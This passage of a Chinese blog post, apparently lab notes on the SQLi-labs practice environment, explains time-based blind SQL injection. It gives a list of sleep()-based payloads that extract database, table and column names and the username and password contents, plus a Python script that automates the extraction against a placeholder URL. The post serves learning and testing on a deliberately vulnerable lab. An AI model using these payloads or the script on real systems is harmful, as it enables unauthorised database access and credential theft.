+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;font size=&#34;5&#34; color=&#34;#FFFF00&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;You are in...........&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;font size=&#34;5&#34; color=&#34;#FFFF00&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;You are in...........&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">//print_r(mysql_error());
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//echo &#34;You have an error in your SQL syntax&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;&lt;/font&gt;&#34;</span><span class="p">;</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;#0000ff&#34; font size= 3&gt;&#39;</span><span class="p">;</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>两行注释就完成无回显。</p>
+<p>如果取消对 print_r(mysql_error()) 的注释，写 id=1&rsquo;</p>
+<p><img loading="lazy" src="../post_pre/pics/SQLi-labs/91.png" alt="../post_pre/pics/SQLi-labs/91.png" srcset="../post_pre/pics/SQLi-labs/91.png?size=small, ../post_pre/pics/SQLi-labs/91.png?size=medium 1.5x, ../post_pre/pics/SQLi-labs/91.png?size=large 2x" data-title="../post_pre/pics/SQLi-labs/91.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>不然就是只有一个 You are in</p>
+<p>对于这种，就用 时间盲注</p>
+<h2 id="时间盲注" class="heading-element">
+  <a href="#%e6%97%b6%e9%97%b4%e7%9b%b2%e6%b3%a8" class="heading-mark"></a>时间盲注</h2><ul>
+<li>
+<p>if()</p>
+</li>
+<li>
+<p>sleep()</p>
+</li>
+<li>
+<p>length()</p>
+</li>
+<li>
+<p>ascii()</p>
+</li>
+</ul>
+<blockquote>
+<p>if(ascii(&hellip;) = 115, sleep(5), 1): 如果截取的字符的 ASCII 值等于 115（ASCII 值为 s），则执行 sleep(5)，即使服务器等待 5 秒钟；否则，返回 1。</p>
+</blockquote>
+<p>这个用代码效果会更好。</p>
+<div class="highlight" id="id-9"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?id=1&#39; and if(1=1,sleep(5),1)--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">判断参数构造。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?id=1&#39;and if(length((select database()))&gt;9,sleep(5),1)--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">判断数据库名长度
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?id=1&#39;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">逐一判断数据库字符
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?id=1&#39;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">判断所有表名长度
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?id=1&#39;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">逐一判断表名
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?id=1&#39;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))&gt;20,sleep(5),1)--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">判断所有字段名的长度
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?id=1&#39;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),1,1))&gt;99,sleep(5),1)--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">逐一判断字段名。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?id=1&#39; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">判断字段内容长度
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?id=1&#39; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">逐一检测内容。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>代码在之前那个的基础上修改就行了。</p>
+<p>下面这个是获取database名的代码示例：</p>
+<div class="highlight" id="id-10"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://xxx/?id=1</span><span class="se">\&#39;</span><span class="s1"> and if(ascii(substr((select database()), </span><span class="si">{0}</span><span class="s1">, 1))=</span><span class="si">{1}</span><span class="s1">, sleep(5), 1)--+&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">guess_character</span><span class="p">(</span><span class="n">position</span><span class="p">,</span> <span class="n">ascii_value</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">position</span><span class="p">,</span> <span class="n">ascii_value</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">elapsed</span><span class="o">.</span><span class="n">total_seconds</span><span class="p">()</span> <span class="o">&gt;=</span> <span class="mi">5</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">chr</span><span class="p">(</span><span class="n">ascii_value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">position</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">characters</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">ascii_value</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">127</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">character</span> <span class="o">=</span> <span class="n">guess_character</span><span class="p">(</span><span class="n">position</span><span class="p">,</span> <span class="n">ascii_value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">character</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">characters</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">character</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">position</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">character</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">database_name</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">characters</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">database_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  </span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="maybe-or-maybe-not" class="heading-element">
+  <a href="#maybe-or-maybe-not" class="heading-mark"></a>maybe or maybe not</h1><p>前几章的基本是这些。</p>
+<p><a href="http://drops.xmd5.com/static/drops/tips-7840.html"target="_blank" rel="external nofollow noopener noreferrer">more</a></p>
+<p><a href="https://ctf-wiki.org/web/sqli/#_10"target="_blank" rel="external nofollow noopener noreferrer">and</a></p>
+<p><a href="http://drops.xmd5.com/static/drops/tips-7299.html"target="_blank" rel="external nofollow noopener noreferrer">more技巧</a></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2023-12-07 11:19:19">Updated on 2023-12-07&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/aa470b6/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://66lueflam144.github.io/posts/aa470b6/" data-title="Sqli Labs" data-hashtags="SQL_INJECTION"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://66lueflam144.github.io/posts/aa470b6/" data-hashtag="SQL_INJECTION"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://66lueflam144.github.io/posts/aa470b6/" data-title="Sqli Labs"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/sql_injection/" class="post-tag" title="Tags - SQL_INJECTION">SQL_INJECTION</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/8f09e57/" class="post-nav-item" rel="prev" title=" easy_serialize_php"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i> easy_serialize_php</a>
+      <a href="/posts/9095c52/" class="post-nav-item" rel="next" title="Python练习笔记">Python练习笔记<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">RockBear</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.2d0f7b71a99aaff94e9624ff32a8dc42ce645a0cba433fdc091cf34735027efd1fa2db024c2f591d768f426255f17bbf3d500b7c967b0437b3979956dffa81c6.css" integrity="sha512-LQ97camar/lOliT/MqjcQs5kWgy6Qz/cCRzzRzUCfv0fotsCTC9ZHXaPQmJV8Xu/PVALfJZ7BDezl5lW3/qBxg=="><script src="/lib/sharer/sharer.min.94c73c706d26a452277a104d6857c0cb04e816ad61c4163b4e0a135426a7767211e0a27c952ea85e3df25aec941374e21053db0f9e7822af8a2f9c4a8a93c4e3.js" integrity="sha512-lMc8cG0mpFInehBNaFfAywToFq1hxBY7TgoTVCandnIR4KJ8lS6oXj3yWuyUE3TiEFPbD554Iq+KL5xKipPE4w==" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.c975ea3858dd8c7347d46343fb510ed236efbde6c0069cc6283eba7639d47e22a560c1391c6314247a0269e1380f93d31b662c4897fa770ab2514bd0bd2d2f68.js" integrity="sha512-yXXqOFjdjHNH1GND+1EO0jbvvebABpzGKD66djnUfiKlYME5HGMUJHoCaeE4D5PTG2YsSJf6dwqyUUvQvS0vaA==" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"}};</script><script src="/js/theme.min.480ceccd06035274f7db6f0a884b175d0c7ce24d886ebb948e6a79cb98222318cf2b5442bc64ebe49857d4925b27f0dda60e08619e37530ede8b0aa82c86ec5b.js" integrity="sha512-SAzszQYDUnT3228KiEsXXQx84k2IbruUjmp5y5giIxjPK1RCvGTr5JhX1JJbJ/Ddpg4IYZ43Uw7eiwqoLIbsWw==" defer></script></body>
+</html>
